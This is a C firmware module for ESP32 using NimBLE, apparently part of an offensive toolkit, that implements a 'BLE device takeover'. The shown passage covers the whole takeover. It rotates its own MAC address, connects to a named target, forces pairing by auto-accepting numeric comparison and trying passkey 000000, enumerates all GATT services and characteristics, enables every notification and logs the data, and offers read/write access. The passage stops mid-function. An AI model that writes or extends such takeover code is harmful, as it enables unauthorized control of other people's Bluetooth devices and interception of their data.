/*
 * ble_takeover.c - BLE Device Takeover Implementation
 *
 * After BLE Deauth + Passkey Capture, this module connects to the
 * REAL target device, enumerates all GATT services/characteristics,
 * enables notifications, and allows reading/writing values.
 *
 * Thread safety:
 *   - `running` is volatile bool: set from stop()/timer, read in task
 *   - Counters are volatile uint32_t: atomic on 32-bit Xtensa
 *   - `cfg` is protected by mutex
 *   - `timeout_fired` is volatile for cross-task visibility
 *
 * Async flow:
 *   The GAP event callback NEVER calls vTaskDelay (which would block
 *   the entire NimBLE host task).  Instead it gives `conn_done_sem`
 *   to wake the takeover task.  Read/write/CCCD operations use their
 *   own semaphores for synchronous-style completion.
 *
 * Dependencies:
 *   - ble_common.h  (nimble_port_init + own_addr_type helper)
 *   - NimBLE stack  (host + controller)
 *   - FreeRTOS
 *   - cJSON
 *   - esp_timer
 */

#include "ble_takeover.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"
#include "cJSON.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

/* NimBLE headers */
#include "nimble/nimble_port.h"
#include "host/ble_hs.h"
#include "host/ble_gap.h"
#include "services/gap/ble_svc_gap.h"
#include "services/gatt/ble_svc_gatt.h"

#include "ble_common.h"

/* ================================================================== */
/*  Constants                                                          */
/* ================================================================== */

static const char *TAG = "ble_takeover";

#define DEFAULT_TIMEOUT_SEC          300
#define DEFAULT_CONNECT_TIMEOUT_MS   15000
#define DEFAULT_AUTO_ENABLE_NOTIF    true
#define DEFAULT_ROTATE_OWN_MAC       true
#define DEFAULT_ADDR_TYPE            BLE_TAKEOVER_ADDR_AUTO
#define DEFAULT_SCAN_ITVL            0x0010
#define DEFAULT_SCAN_WINDOW          0x0010
#define DEFAULT_CONN_ITVL_MIN        0x0006
#define DEFAULT_CONN_ITVL_MAX        0x000C
#define DEFAULT_CONN_LATENCY         0
#define DEFAULT_CONN_SUPERVISION     0x0064

#define STOP_SEM_TIMEOUT_MS          5000
#define CONN_DONE_TIMEOUT_MS         30000
#define TASK_STACK_SIZE              6144
#define TASK_PRIORITY                5

#define MAX_SERVICES                 16
#define MAX_CHARS                    64
#define MAX_READ_LEN                 128
#define MAX_NOTIF_LOG                32

/* ================================================================== */
/*  Module state                                                       */
/* ================================================================== */

/* Control */
static volatile bool running           = false;
static SemaphoreHandle_t mutex         = NULL;
static SemaphoreHandle_t task_exit_sem = NULL;
static SemaphoreHandle_t conn_done_sem = NULL;
static TaskHandle_t task_handle        = NULL;

/* Timeout timer */
static esp_timer_handle_t timeout_timer = NULL;
static volatile bool timeout_fired      = false;

/* Timing */
static volatile int64_t start_time_ms  = 0;

/* State machine */
static volatile takeover_state_t takeover_state = BLE_TAKEOVER_IDLE;
static volatile uint16_t active_conn_handle     = 0xFFFF;
static volatile uint8_t active_addr_type        = BLE_ADDR_PUBLIC;
static volatile uint32_t status13_count         = 0;

/* Counters (atomic on 32-bit Xtensa) */
static volatile uint32_t connect_count       = 0;
static volatile uint32_t read_count          = 0;
static volatile uint32_t write_count         = 0;
static volatile uint32_t notify_rx_count     = 0;
static volatile uint32_t notify_enabled_count = 0;
static volatile uint32_t enc_change_count    = 0;
static volatile uint32_t fail_count          = 0;

/* Configuration */
static ble_takeover_config_t cfg = {
    .target_addr              = "",
    .timeout_sec              = DEFAULT_TIMEOUT_SEC,
    .connect_timeout_ms       = DEFAULT_CONNECT_TIMEOUT_MS,
    .auto_enable_notifies     = DEFAULT_AUTO_ENABLE_NOTIF,
    .rotate_own_mac           = DEFAULT_ROTATE_OWN_MAC,
    .addr_type                = DEFAULT_ADDR_TYPE,
    .scan_itvl                = DEFAULT_SCAN_ITVL,
    .scan_window              = DEFAULT_SCAN_WINDOW,
    .conn_itvl_min            = DEFAULT_CONN_ITVL_MIN,
    .conn_itvl_max            = DEFAULT_CONN_ITVL_MAX,
    .conn_latency             = DEFAULT_CONN_LATENCY,
    .conn_supervision_timeout = DEFAULT_CONN_SUPERVISION,
};

/* SM config save/restore */
static uint8_t saved_io_cap, saved_bonding, saved_mitm, saved_sc;
static uint8_t saved_our_key_dist, saved_their_key_dist;

/* ---- Discovered services / characteristics ---- */
typedef struct {
    uint16_t start_handle;
    uint16_t end_handle;
    ble_uuid_any_t uuid;
    int chr_count;
    int chr_start;
} svc_entry_t;

typedef struct {
    uint16_t handle;
    uint16_t val_handle;
    uint16_t cccd_handle;   /* Client Characteristic Config Descriptor */
    uint8_t  properties;
    bool     notify_enabled;
    ble_uuid_any_t uuid;
    int svc_idx;
} chr_entry_t;

static svc_entry_t svcs[MAX_SERVICES];
static int svc_count = 0;
static chr_entry_t chrs[MAX_CHARS];
static int chr_count = 0;
static int disc_svc_idx = 0;

/* ---- Notification ring buffer ---- */
typedef struct {
    uint16_t handle;
    char     value_hex[256];
    int64_t  timestamp_ms;
} notif_entry_t;

static notif_entry_t notif_log[MAX_NOTIF_LOG];
static int notif_count = 0;
static int notif_head  = 0;

/* ---- Read result ---- */
static SemaphoreHandle_t read_sem = NULL;
static char read_value_hex[256]   = "";
static uint16_t read_handle_done  = 0;
static bool read_success          = false;

/* ---- Write result ---- */
static SemaphoreHandle_t write_sem = NULL;
static bool write_success         = false;
static uint16_t write_handle_done = 0;

/* ---- CCCD write result ---- */
static SemaphoreHandle_t cccd_sem = NULL;
static bool cccd_success          = false;

/* ================================================================== */
/*  Forward declarations                                               */
/* ================================================================== */

static void takeover_task(void *arg);
static void timeout_cb(void *arg);
static int gap_cb(struct ble_gap_event *event, void *arg);
static int svc_disc_cb(uint16_t conn_handle, const struct ble_gatt_error *error,
                       const struct ble_gatt_svc *svc, void *arg);
static int chr_disc_cb(uint16_t conn_handle, const struct ble_gatt_error *error,
                       const struct ble_gatt_chr *chr, void *arg);
static int read_cb(uint16_t conn_handle, const struct ble_gatt_error *error,
                   struct ble_gatt_attr *attr, void *arg);
static int write_cb(uint16_t conn_handle, const struct ble_gatt_error *error,
                    struct ble_gatt_attr *attr, void *arg);
static int cccd_write_cb(uint16_t conn_handle, const struct ble_gatt_error *error,
                         struct ble_gatt_attr *attr, void *arg);
static void start_next_chr_disc(void);
static void auto_enable_notifies(void);
static void cleanup_ble_state(void);
static void save_sm_config(void);
static void set_takeover_sm_config(void);
static void restore_sm_config(void);
static void store_notification(uint16_t handle, const uint8_t *data, int len);

/* ================================================================== */
/*  Helpers                                                            */
/* ================================================================== */

static int64_t now_ms(void)
{
    return (int64_t)esp_timer_get_time() / 1000;
}

static void set_random_mac(void)
{
    uint8_t rnd_addr[6];
    esp_fill_random(rnd_addr, sizeof(rnd_addr));
    rnd_addr[5] = (rnd_addr[5] & 0x3F) | 0xC0;   /* Random static: two LSBs = 11 */
    int rc = ble_hs_id_set_rnd(rnd_addr);
    if (rc != 0) {
        ESP_LOGD(TAG, "ble_hs_id_set_rnd failed: %d", rc);
    }
}

static void addr_from_str(const char *s, uint8_t out[6])
{
    int v[6] = {0};
    if (sscanf(s, "%x:%x:%x:%x:%x:%x",
               &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) == 6) {
        for (int i = 0; i < 6; i++) {
            out[i] = (uint8_t)v[5 - i];
        }
    } else {
        memset(out, 0, 6);
    }
}

const char *ble_takeover_get_state_str(void)
{
    switch (takeover_state) {
        case BLE_TAKEOVER_IDLE:        return "idle";
        case BLE_TAKEOVER_CONNECTING:  return "connecting";
        case BLE_TAKEOVER_DISCOVERING: return "discovering";
        case BLE_TAKEOVER_CONNECTED:   return "connected";
        case BLE_TAKEOVER_DISCONNECTED:return "disconnected";
        default:                       return "unknown";
    }
}

static const char *addr_type_str(takeover_addr_type_t t)
{
    switch (t) {
        case BLE_TAKEOVER_ADDR_PUBLIC: return "PUBLIC";
        case BLE_TAKEOVER_ADDR_RANDOM: return "RANDOM";
        case BLE_TAKEOVER_ADDR_AUTO:   return "AUTO";
        default:                       return "UNKNOWN";
    }
}

static void uuid_to_str(const ble_uuid_any_t *uuid, char *buf, size_t len)
{
    if (uuid->u.type == BLE_UUID_TYPE_16) {
        snprintf(buf, len, "0x%04X", uuid->u16.value);
    } else if (uuid->u.type == BLE_UUID_TYPE_32) {
        snprintf(buf, len, "0x%08lX", (unsigned long)uuid->u32.value);
    } else {
        const uint8_t *b = uuid->u128.value;
        snprintf(buf, len,
                 "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
                 b[15], b[14], b[13], b[12], b[11], b[10], b[9], b[8],
                 b[7],  b[6],  b[5],  b[4],  b[3],  b[2],  b[1], b[0]);
    }
}

static void props_to_str(uint8_t p, char *buf, size_t len)
{
    int o = 0;
    buf[0] = '\0';
    if (p & BLE_GATT_CHR_F_READ)         { buf[o++] = 'R'; buf[o] = '\0'; }
    if (p & BLE_GATT_CHR_F_WRITE)        { buf[o++] = 'W'; buf[o] = '\0'; }
    if (p & BLE_GATT_CHR_F_WRITE_NO_RSP) { buf[o++] = 'w'; buf[o] = '\0'; }
    if (p & BLE_GATT_CHR_F_NOTIFY)       { buf[o++] = 'N'; buf[o] = '\0'; }
    if (p & BLE_GATT_CHR_F_INDICATE)     { buf[o++] = 'I'; buf[o] = '\0'; }
}

static int hex_to_bytes(const char *hex, uint8_t *out, size_t out_len)
{
    size_t hlen = strlen(hex);
    if (hlen % 2 != 0) return -1;
    size_t blen = hlen / 2;
    if (blen > out_len) return -1;
    for (size_t i = 0; i < blen; i++) {
        unsigned int b;
        if (sscanf(hex + i * 2, "%2x", &b) != 1) return -1;
        out[i] = (uint8_t)b;
    }
    return (int)blen;
}

/* ================================================================== */
/*  Store notification in ring buffer                                  */
/* ================================================================== */

static void store_notification(uint16_t handle, const uint8_t *data, int len)
{
    notif_entry_t *slot = &notif_log[notif_head];
    slot->handle = handle;
    slot->timestamp_ms = now_ms();

    slot->value_hex[0] = '\0';
    for (int i = 0; i < len && i < 127; i++) {
        sprintf(slot->value_hex + i * 2, "%02x", data[i]);
    }
    slot->value_hex[len * 2] = '\0';

    notif_head = (notif_head + 1) % MAX_NOTIF_LOG;
    if (notif_count < MAX_NOTIF_LOG) notif_count++;

    ESP_LOGI(TAG, "NOTIFY handle=%d value=%s", handle, slot->value_hex);
}

/* ================================================================== */
/*  BLE cleanup                                                        */
/* ================================================================== */

static void cleanup_ble_state(void)
{
    int max_wait = 10;
    while (max_wait-- > 0) {
        bool busy = ble_gap_conn_active() || ble_gap_adv_active() || ble_gap_disc_active();
        if (!busy) break;
        if (ble_gap_conn_active()) ble_gap_conn_cancel();
        if (ble_gap_adv_active())  ble_gap_adv_stop();
        if (ble_gap_disc_active()) ble_gap_disc_cancel();
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    ble_common_disconnect_all();
    vTaskDelay(pdMS_TO_TICKS(200));
}

/* ================================================================== */
/*  SM config save/restore                                             */
/* ================================================================== */

static void save_sm_config(void)
{
    saved_io_cap         = ble_hs_cfg.sm_io_cap;
    saved_bonding        = ble_hs_cfg.sm_bonding;
    saved_mitm           = ble_hs_cfg.sm_mitm;
    saved_sc             = ble_hs_cfg.sm_sc;
    saved_our_key_dist   = ble_hs_cfg.sm_our_key_dist;
    saved_their_key_dist = ble_hs_cfg.sm_their_key_dist;
}

static void set_takeover_sm_config(void)
{
    ble_hs_cfg.sm_io_cap         = BLE_SM_IO_CAP_KEYBOARD_DISP;
    ble_hs_cfg.sm_bonding        = 1;
    ble_hs_cfg.sm_mitm           = 1;
    ble_hs_cfg.sm_sc             = 1;
    ble_hs_cfg.sm_our_key_dist   = BLE_SM_PAIR_KEY_DIST_ENC | BLE_SM_PAIR_KEY_DIST_ID;
    ble_hs_cfg.sm_their_key_dist = BLE_SM_PAIR_KEY_DIST_ENC | BLE_SM_PAIR_KEY_DIST_ID;
}

static void restore_sm_config(void)
{
    ble_hs_cfg.sm_io_cap         = saved_io_cap;
    ble_hs_cfg.sm_bonding        = saved_bonding;
    ble_hs_cfg.sm_mitm           = saved_mitm;
    ble_hs_cfg.sm_sc             = saved_sc;
    ble_hs_cfg.sm_our_key_dist   = saved_our_key_dist;
    ble_hs_cfg.sm_their_key_dist = saved_their_key_dist;
}

/* ================================================================== */
/*  Timeout timer                                                      */
/* ================================================================== */

static void timeout_cb(void *arg)
{
    (void)arg;
    timeout_fired = true;
    running       = false;
    ESP_LOGW(TAG, "Timeout expired -- stopping BLE takeover");
}

/* ================================================================== */
/*  Service Discovery Callback                                         */
/* ================================================================== */

static int svc_disc_cb(uint16_t ch, const struct ble_gatt_error *error,
                       const struct ble_gatt_svc *svc, void *arg)
{
    if (error->status == 0) {
        if (svc_count < MAX_SERVICES) {
            svcs[svc_count].start_handle = svc->start_handle;
            svcs[svc_count].end_handle   = svc->end_handle;
            memcpy(&svcs[svc_count].uuid, &svc->uuid, sizeof(ble_uuid_any_t));
            svcs[svc_count].chr_count = 0;
            svcs[svc_count].chr_start = chr_count;
            svc_count++;
        }
        return 0;
    }

    if (error->status == BLE_HS_EDONE) {
        ESP_LOGI(TAG, "Service discovery done: %d services", svc_count);
        disc_svc_idx = 0;
        start_next_chr_disc();
        return 0;
    }

    ESP_LOGW(TAG, "Svc disc error: %d", error->status);
    takeover_state = BLE_TAKEOVER_CONNECTED;
    return 0;
}

/* ================================================================== */
/*  Characteristic Discovery                                           */
/* ================================================================== */

static void start_next_chr_disc(void)
{
    if (disc_svc_idx >= svc_count) {
        ESP_LOGI(TAG, "Discovery complete: %d svcs, %d chrs", svc_count, chr_count);

        /* Auto-enable notifications on all N/I characteristics */
        if (cfg.auto_enable_notifies) {
            auto_enable_notifies();
        }

        takeover_state = BLE_TAKEOVER_CONNECTED;

        /* Signal that discovery is done */
        if (conn_done_sem) xSemaphoreGive(conn_done_sem);
        return;
    }

    int rc = ble_gattc_disc_all_chrs(active_conn_handle,
                                      svcs[disc_svc_idx].start_handle,
                                      svcs[disc_svc_idx].end_handle,
                                      chr_disc_cb, NULL);
    if (rc != 0) {
        ESP_LOGW(TAG, "Chr disc start failed svc %d rc=%d", disc_svc_idx, rc);
        disc_svc_idx++;
        start_next_chr_disc();
    }
}

static int chr_disc_cb(uint16_t ch, const struct ble_gatt_error *error,
                       const struct ble_gatt_chr *chr, void *arg)
{
    if (error->status == 0) {
        if (chr_count < MAX_CHARS) {
            chrs[chr_count].handle     = chr->def_handle;
            chrs[chr_count].val_handle = chr->val_handle;
            chrs[chr_count].cccd_handle = chr->val_handle + 1;  /* CCCD typically right after */
            chrs[chr_count].properties = chr->properties;
            chrs[chr_count].notify_enabled = false;
            memcpy(&chrs[chr_count].uuid, &chr->uuid, sizeof(ble_uuid_any_t));
            chrs[chr_count].svc_idx = disc_svc_idx;
            svcs[disc_svc_idx].chr_count++;
            chr_count++;
        }
        return 0;
    }

    if (error->status == BLE_HS_EDONE) {
        ESP_LOGI(TAG, "Svc %d: %d chrs", disc_svc_idx, svcs[disc_svc_idx].chr_count);
        disc_svc_idx++;
        start_next_chr_disc();
        return 0;
    }

    ESP_LOGW(TAG, "Chr disc error: %d", error->status);
    disc_svc_idx++;
    start_next_chr_disc();
    return 0;
}

/* ================================================================== */
/*  Auto-enable notifications after discovery                          */
/* ================================================================== */

static void auto_enable_notifies(void)
{
    int enabled = 0;
    for (int i = 0; i < chr_count; i++) {
        if (chrs[i].properties & (BLE_GATT_CHR_F_NOTIFY | BLE_GATT_CHR_F_INDICATE)) {
            /* Enable notify on this characteristic */
            uint16_t val = 0x0001;  /* Enable notifications */
            if (chrs[i].properties & BLE_GATT_CHR_F_INDICATE) {
                val = 0x0003;  /* Enable both notify + indicate if supported */
            }

            if (cccd_sem) xSemaphoreTake(cccd_sem, 0);

            struct os_mbuf *om = ble_hs_mbuf_from_flat(&val, 2);
            if (om) {
                int rc = ble_gattc_write(active_conn_handle, chrs[i].cccd_handle,
                                         om, cccd_write_cb, NULL);
                if (rc == 0) {
                    /* Wait for write to complete */
                    if (cccd_sem) xSemaphoreTake(cccd_sem, pdMS_TO_TICKS(2000));
                    chrs[i].notify_enabled = true;
                    notify_enabled_count++;
                    enabled++;
                    ESP_LOGI(TAG, "Enabled notify on handle %d (CCCD=%d)",
                             chrs[i].val_handle, chrs[i].cccd_handle);
                } else {
                    ESP_LOGW(TAG, "Failed to enable notify handle %d: rc=%d",
                             chrs[i].val_handle, rc);
                }
                /* Small delay between CCCD writes */
                vTaskDelay(pdMS_TO_TICKS(100));
            }
        }
    }
    ESP_LOGI(TAG, "Auto-enabled %d notifications", enabled);
}

/* ================================================================== */
/*  Read Callback                                                      */
/* ================================================================== */

static int read_cb(uint16_t ch, const struct ble_gatt_error *error,
                   struct ble_gatt_attr *attr, void *arg)
{
    if (error->status == 0 && attr != NULL) {
        uint8_t data[MAX_READ_LEN];
        int clen = os_mbuf_copydata(attr->om, 0, sizeof(data), data);
        if (clen < 0) clen = 0;

        read_value_hex[0] = '\0';
        for (int i = 0; i < clen && i < MAX_READ_LEN; i++) {
            sprintf(read_value_hex + i * 2, "%02x", data[i]);
        }
        read_value_hex[clen * 2] = '\0';
        read_success = true;
        read_count++;
        ESP_LOGI(TAG, "Read handle %d: %s", attr->handle, read_value_hex);
    } else {
        snprintf(read_value_hex, sizeof(read_value_hex), "error:%d", error->status);
        read_success = false;
        ESP_LOGW(TAG, "Read failed: %d", error->status);
    }
    read_handle_done = attr ? attr->handle : 0;
    if (read_sem) xSemaphoreGive(read_sem);
    return 0;
}

/* ================================================================== */
/*  Write Callback                                                     */
/* ================================================================== */

static int write_cb(uint16_t ch, const struct ble_gatt_error *error,
                    struct ble_gatt_attr *attr, void *arg)
{
    write_success = (error->status == 0);
    write_handle_done = attr ? attr->handle : 0;
    if (write_success) write_count++;
    ESP_LOGI(TAG, "Write handle %d: %s", write_handle_done,
             write_success ? "OK" : "FAIL");
    if (write_sem) xSemaphoreGive(write_sem);
    return 0;
}

/* ================================================================== */
/*  CCCD Write Callback                                                */
/* ================================================================== */

static int cccd_write_cb(uint16_t ch, const struct ble_gatt_error *error,
                         struct ble_gatt_attr *attr, void *arg)
{
    cccd_success = (error->status == 0);
    ESP_LOGD(TAG, "CCCD write: %s", cccd_success ? "OK" : "FAIL");
    if (cccd_sem) xSemaphoreGive(cccd_sem);
    return 0;
}

/* ================================================================== */
/*  GAP Event Handler                                                  */
/* ================================================================== */

static int gap_cb(struct ble_gap_event *event, void *arg)
{
    switch (event->type) {

    case BLE_GAP_EVENT_CONNECT:
        ESP_LOGI(TAG, "CONNECT status=%d handle=%d",
                 event->connect.status, event->connect.conn_handle);
        if (event->connect.status == 0) {
            connect_count++;
            status13_count = 0;
            active_conn_handle = event->connect.conn_handle;
            takeover_state = BLE_TAKEOVER_DISCOVERING;
            ESP_LOGI(TAG, "Connected! Starting discovery... (#%u)",
                     (unsigned)connect_count);

            svc_count = 0;
            chr_count = 0;
            disc_svc_idx = 0;

            int rc = ble_gattc_disc_all_svcs(active_conn_handle, svc_disc_cb, NULL);
            if (rc != 0) {
                ESP_LOGE(TAG, "Svc disc start failed: %d", rc);
                takeover_state = BLE_TAKEOVER_CONNECTED;
                if (conn_done_sem) xSemaphoreGive(conn_done_sem);
            }
        } else {
            fail_count++;
            ESP_LOGW(TAG, "Connect failed: %d", event->connect.status);

            if (event->connect.status == 13) {
                status13_count++;
                /* AUTO mode: toggle address type */
                if (cfg.addr_type == BLE_TAKEOVER_ADDR_AUTO) {
                    active_addr_type = (active_addr_type == BLE_ADDR_PUBLIC)
                        ? BLE_ADDR_RANDOM : BLE_ADDR_PUBLIC;
                }
            }

            takeover_state = BLE_TAKEOVER_DISCONNECTED;

            /* If first attempt fails, signal the task to retry */
            if (connect_count == 0 && conn_done_sem) {
                xSemaphoreGive(conn_done_sem);
            }
        }
        break;

    case BLE_GAP_EVENT_DISCONNECT:
        ESP_LOGI(TAG, "DISCONNECT reason=%d", event->disconnect.reason);
        active_conn_handle = 0xFFFF;
        takeover_state = BLE_TAKEOVER_DISCONNECTED;
        running = false;
        if (conn_done_sem) xSemaphoreGive(conn_done_sem);
        break;

    case BLE_GAP_EVENT_PASSKEY_ACTION: {
        struct ble_sm_io pkey = {0};
        pkey.action = event->passkey.params.action;
        ESP_LOGI(TAG, "PASSKEY ACTION: %d", pkey.action);

        switch (event->passkey.params.action) {
        case BLE_SM_IOACT_NUMCMP:
            ESP_LOGI(TAG, "Numeric Comparison - Auto-accepting");
            pkey.numcmp_accept = 1;
            break;
        case BLE_SM_IOACT_DISP: {
            uint32_t pk = esp_random() % 1000000;
            ESP_LOGI(TAG, "Display Passkey: %06u", (unsigned)pk);
            pkey.passkey = pk;
            break;
        }
        case BLE_SM_IOACT_INPUT:
            ESP_LOGI(TAG, "Input Passkey: trying 000000");
            pkey.passkey = 0;
            break;
        case BLE_SM_IOACT_OOB:
            break;
        default:
            break;
        }

        int rc = ble_sm_inject_io(event->passkey.conn_handle, &pkey);
        if (rc != 0) ESP_LOGW(TAG, "SM inject failed: %d", rc);
        break;
    }

    case BLE_GAP_EVENT_ENC_CHANGE:
        enc_change_count++;
        ESP_LOGI(TAG, "ENC_CHANGE status=%d (#%u)",
                 event->enc_change.status, (unsigned)enc_change_count);
        if (event->enc_change.status == 0) {
            ESP_LOGI(TAG, "Pairing complete - re-discovering services");
            if (takeover_state == BLE_TAKEOVER_DISCOVERING ||
                takeover_state == BLE_TAKEOVER_CONNECTED) {
                svc_count = 0;
                chr_count = 0;
                disc_svc_idx = 0;
                int rc = ble_gattc_disc_all_svcs(active_conn_handle, svc_disc_cb, NULL);
                if (rc != 0) {
                    ESP_LOGE(TAG, "Re-discovery failed: %d", rc);
                    takeover_state = BLE_TAKEOVER_CONNECTED;
                } else {
                    takeover_state = BLE_TAKEOVER_DISCOVERING;
                }
            }
        } else {
            ESP_LOGW(TAG, "Encryption failed: %d", event->enc_change.status);
        }
        break;

    case BLE_GAP_EVENT_REPEAT_PAIRING:
        return BLE_GAP_REPEAT_PAIRING_RETRY;

    case BLE_GAP_EVENT_NOTIFY_RX: {
        notify_rx_count++;
        uint16_t attr_handle = event->notify_rx.attr_handle;
        uint8_t data[MAX_READ_LEN];
        int clen = os_mbuf_copydata(event->notify_rx.om, 0, sizeof(data), data);
        if (clen < 0) clen = 0;
        store_notification(attr_handle, data, clen);
        break;
    }

    case BLE_GAP_EVENT_MTU:
        ESP_LOGI(TAG, "MTU: %d", event->mtu.value);
        break;

    case BLE_GAP_EVENT_CONN_UPDATE:
        ESP_LOGD(TAG, "Conn update result: status=%d", event->conn_update.status);
        break;

    default:
        break;
    }
    return 0;
}

/* ================================================================== */
/*  Main task                                                          */
/* ================================================================== */

static void takeover_task(void *arg)
{
    (void)arg;

    ESP_LOGI(TAG, "Takeover task started (target=%s, timeout=%us)",
             cfg.target_addr, (unsigned)cfg.timeout_sec);

    /* Reset discovery data */
    svc_count = 0;
    chr_count = 0;
    notif_count = 0;
    notif_head = 0;
    read_value_hex[0] = '\0';

    save_sm_config();
    set_takeover_sm_config();
    cleanup_ble_state();

    start_time_ms = now_ms();

    /* ---- Connection phase with retry ---- */
    bool connected = false;
    int max_retries = 3;

    for (int attempt = 0; attempt < max_retries && running; attempt++) {
        /* Rotate own MAC if configured */
        if (cfg.rotate_own_mac) {
            set_random_mac();
        }

        /* Determine address type */
        uint8_t use_addr_type = BLE_ADDR_PUBLIC;
        if (cfg.addr_type == BLE_TAKEOVER_ADDR_RANDOM) {
            use_addr_type = BLE_ADDR_RANDOM;
        } else if (cfg.addr_type == BLE_TAKEOVER_ADDR_AUTO) {
            use_addr_type = active_addr_type;
        }

        /* Parse target address */
        ble_addr_t peer_addr;
        peer_addr.type = use_addr_type;
        addr_from_str(cfg.target_addr, peer_addr.val);

        /* Build connection parameters from config */
        struct ble_gap_conn_params conn_params = {
            .scan_itvl           = (uint16_t)cfg.scan_itvl,
            .scan_window         = (uint16_t)cfg.scan_window,
            .itvl_min            = (uint16_t)cfg.conn_itvl_min,
            .itvl_max            = (uint16_t)cfg.conn_itvl_max,
            .latency             = (uint16_t)cfg.conn_latency,
            .supervision_timeout = (uint16_t)cfg.conn_supervision_timeout,
            .min_ce_len          = 0,
            .max_ce_len          = 0,
        };

        takeover_state = BLE_TAKEOVER_CONNECTING;
        status13_count = 0;

        xSemaphoreTake(conn_done_sem, 0);

        uint8_t own_addr_type = ble_common_own_addr_type();

        ESP_LOGI(TAG, "Connecting to %s (addr_type=%s, attempt %d/%d)...",
                 cfg.target_addr,
                 use_addr_type == BLE_ADDR_RANDOM ? "RANDOM" : "PUBLIC",
                 attempt + 1, max_retries);

        int rc = ble_gap_connect(own_addr_type, &peer_addr,
                                 cfg.connect_timeout_ms,
                                 &conn_params, gap_cb, NULL);
        if (rc != 0) {
            ESP_LOGW(TAG, "Connect start failed (rc=%d)", rc);

            if (rc == BLE_HS_EBUSY || rc == BLE_HS_EALREADY) {
                cleanup_ble_state();
            }

            /* Try alternate address type on failure */
            if (cfg.addr_type == BLE_TAKEOVER_ADDR_AUTO) {
                active_addr_type = (active_addr_type == BLE_ADDR_PUBLIC)
                    ? BLE_ADDR_RANDOM : BLE_ADDR_PUBLIC;
            }

            vTaskDelay(pdMS_TO_TICKS(1000));
            continue;
        }

        /* Wait for connection result */
        if (xSemaphoreTake(conn_done_sem, pdMS_TO_TICKS(cfg.connect_timeout_ms + 2000)) != pdTRUE) {
            ESP_LOGW(TAG, "Connection timed out");
            if (ble_gap_conn_active()) ble_gap_conn_cancel();
            vTaskDelay(pdMS_TO_TICKS(500));
            continue;
        }

        if (takeover_state == BLE_TAKEOVER_DISCOVERING) {
            /* Connected, now wait for discovery to complete */
            ESP_LOGI(TAG, "Connected! Waiting for GATT discovery...");

            if (xSemaphoreTake(conn_done_sem, pdMS_TO_TICKS(CONN_DONE_TIMEOUT_MS)) != pdTRUE) {
                ESP_LOGW(TAG, "Discovery timed out");
            }

            if (takeover_state == BLE_TAKEOVER_CONNECTED) {
                connected = true;
                break;
            }
        } else if (takeover_state == BLE_TAKEOVER_CONNECTED) {
            /* Connected + auto-discovery already done (no services found) */
            connected = true;
            break;
        } else if (takeover_state == BLE_TAKEOVER_DISCONNECTED) {
            /* Connection failed, retry */
            ESP_LOGW(TAG, "Connection lost, retrying...");

            if (cfg.addr_type == BLE_TAKEOVER_ADDR_AUTO) {
                active_addr_type = (active_addr_type == BLE_ADDR_PUBLIC)
                    ? BLE_ADDR_RANDOM : BLE_ADDR_PUBLIC;
            }

            cleanup_ble_state();
            vTaskDelay(pdMS_TO_TICKS(1000));
            continue;
        }
    }

    if (!connected) {
        ESP_LOGW(TAG, "Takeover failed after %d attempts (state=%s)",
                 max_retries, ble_takeover_get_state_str());
        if (active_conn_handle != 0xFFFF) {
            ble_gap_terminate(active_conn_handle, BLE_ERR_REM_USER_CONN_TERM);
        }
        vTaskDelay(pdMS_TO_TICKS(500));
        cleanup_ble_state();
        restore_sm_config();

        takeover_state = BLE_TAKEOVER_DISCONNECTED;

        if (timeout_timer) esp_timer_stop(timeout_timer);
        running = false;

        if (task_exit_sem) xSemaphoreGive(task_exit_sem);
        task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }

    ESP_LOGI(TAG, "=== TAKEOVER SUCCESSFUL ===");
    ESP_LOGI(TAG, "Device: %s  Services: %d  Chars: %d",
             cfg.target_addr, svc_count, chr_count);

    /* ---- Maintain connection — keep receiving notifications ---- */
    while (running && takeover_state == BLE_TAKEOVER_CONNECTED) {
        vTaskDelay(pdMS_TO_TICKS(1000));
    }

    /* ---- Disconnect ---- */
    if (active_conn_handle != 0xFFFF) {
        ble_gap_terminate(active_conn_handle, BLE_ERR_REM_USER_CONN_TERM);
    }
    vTaskDelay(pdMS_TO_TICKS(500));
    cleanup_ble_state();
    restore_sm_config();

    if (timeout_timer) esp_timer_stop(timeout_timer);

    takeover_state = BLE_TAKEOVER_IDLE;
    active_conn_handle = 0xFFFF;
    running = false;

    ESP_LOGI(TAG, "Takeover task exiting (connects=%u, reads=%u, writes=%u, notifs=%u)",
             (unsigned)connect_count, (unsigned)read_count,
             (unsigned)write_count, (unsigned)notify_rx_count);

    if (task_exit_sem) xSemaphoreGive(task_exit_sem);
    task_handle = NULL;
    vTaskDelete(NULL);
}

/* ================================================================== */
/*  Public API -- Lifecycle                                            */
/* ================================================================== */

void ble_takeover_init(void)
{
    ble_common_init();

    mutex         = xSemaphoreCreateMutex();
    conn_done_sem = xSemaphoreCreateBinary();
    task_exit_sem = xSemaphoreCreateBinary();
    read_sem      = xSemaphoreCreateBinary();
    write_sem     = xSemaphoreCreateBinary();
    cccd_sem      = xSemaphoreCreateBinary();

    /* Create one-shot timeout timer */
    esp_timer_create_args_t timer_args = {
        .callback = timeout_cb,
        .name     = "ble_takeover_timeout",
    };
    esp_timer_create(&timer_args, &timeout_timer);

    ESP_LOGI(TAG, "ble_takeover initialized (connect + discover + notify)");
}

void ble_takeover_start(const char *target_addr)
{
    ble_takeover_config_t default_cfg = {
        .target_addr              = "",
        .timeout_sec              = DEFAULT_TIMEOUT_SEC,
        .connect_timeout_ms       = DEFAULT_CONNECT_TIMEOUT_MS,
        .auto_enable_notifies     = DEFAULT_AUTO_ENABLE_NOTIF,
        .rotate_own_mac           = DEFAULT_ROTATE_OWN_MAC,
        .addr_type                = DEFAULT_ADDR_TYPE,
        .scan_itvl                = DEFAULT_SCAN_ITVL,
        .scan_window              = DEFAULT_SCAN_WINDOW,
        .conn_itvl_min            = DEFAULT_CONN_ITVL_MIN,
        .conn_itvl_max            = DEFAULT_CONN_ITVL_MAX,
        .conn_latency             = DEFAULT_CONN_LATENCY,
        .conn_supervision_timeout = DEFAULT_CONN_SUPERVISION,
    };
    if (target_addr) {
        strncpy(default_cfg.target_addr, target_addr,
